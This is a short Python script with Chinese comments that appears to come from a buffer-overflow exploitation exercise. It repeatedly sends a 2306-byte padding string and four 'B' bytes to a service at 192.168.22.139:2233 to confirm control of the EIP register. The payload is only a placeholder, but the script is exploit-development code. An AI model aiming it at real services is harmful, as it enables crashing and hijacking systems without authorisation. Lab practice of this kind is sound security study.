#py3
import sys,socket
from time import sleep

#使用A和B代替，A为偏移量，B为eip位置
shellcode="A"*2306+"B"*4
while True:
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(("192.168.22.139",2233))

        payload="" +shellcode

        s.send((payload.encode()))
        s.close()

    except:
        print("SERVER ERROR")
        sys.exit()


#eip应为42424242 为4个B的十六进制编码

